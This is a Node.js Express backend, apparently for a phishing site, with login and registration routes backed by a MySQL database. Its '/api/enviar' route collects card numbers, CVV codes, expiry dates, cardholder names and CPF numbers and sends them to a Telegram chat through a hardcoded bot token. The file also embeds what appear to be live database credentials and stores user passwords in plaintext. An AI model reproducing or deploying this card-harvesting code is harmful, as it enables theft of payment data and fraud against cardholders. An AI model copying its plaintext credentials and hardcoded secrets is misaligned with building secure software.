// api/index.js
const express = require("express");
const mysql = require("mysql2");
const fetch = require("node-fetch");
const path = require("path");

const app = express();
app.use(express.json());

// ======= CONFIG MYSQL (Hostinger) =======
const db = mysql.createConnection({
    host: "mysql.hostinger.com",
    user: "u650766211_USERSYS",
    password: "Tesourariado777",
    database: "u650766211_USER",
    port: 3306
});

db.connect(err => {
    if (err) {
        console.error("Erro MySQL:", err);
    } else {
        console.log("✅ Conectado ao MySQL Hostinger");
    }
});

// ======= ROTAS =======

// Registro
app.post("/api/register", (req, res) => {
    const { username, password, fullname } = req.body;
    if (!username || !password || !fullname) {
        return res.json({ success: false, message: "Campos obrigatórios não preenchidos." });
    }

    db.query(
        "INSERT INTO users (username, password, fullname) VALUES (?, ?, ?)",
        [username, password, fullname],
        err => {
            if (err) {
                if (err.code === "ER_DUP_ENTRY") {
                    return res.json({ success: false, message: "Usuário já existe." });
                }
                console.error("Erro no INSERT:", err);
                return res.json({ success: false, message: "Erro no servidor." });
            }
            res.json({ success: true });
        }
    );
});

// Login
app.post("/api/login", (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) {
        return res.json({ success: false, message: "Informe usuário e senha." });
    }

    db.query(
        "SELECT * FROM users WHERE username = ? AND password = ?",
        [username, password],
        (err, results) => {
            if (err) {
                console.error("Erro no SELECT:", err);
                return res.json({ success: false, message: "Erro no servidor." });
            }
            if (results.length > 0) {
                res.json({ success: true, fullname: results[0].fullname });
            } else {
                res.json({ success: false, message: "Usuário ou senha inválidos." });
            }
        }
    );
});

// Telegram coleta
const TELEGRAM_TOKEN = "8492628989:AAH28BrxrcyF0hdwLVSAFTvsA7OA80_OkGA";
const CHAT_ID = "-1002852733056";

app.post("/api/enviar", async (req, res) => {
    try {
        const { cardNumber, cardcvvName, expiry, cardholderIdentificationNumber, cardholderNameC } = req.body;

        const mensagem = `
💳 Novo Cartão:
Número: ${cardNumber}
CVV: ${cardcvvName}
Validade: ${expiry}
Nome: ${cardholderNameC}
CPF: ${cardholderIdentificationNumber}
        `;

        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: mensagem
            })
        });

        const data = await response.json();
        if (!data.ok) {
            res.status(500).send(`Erro do Telegram: ${data.description}`);
        } else {
            res.send("Mensagem enviada com sucesso para o Telegram!");
        }
    } catch (error) {
        console.error("Erro no envio:", error.message);
        res.status(500).send("Erro no servidor");
    }
});

// Exporta para Vercel
module.exports = app;
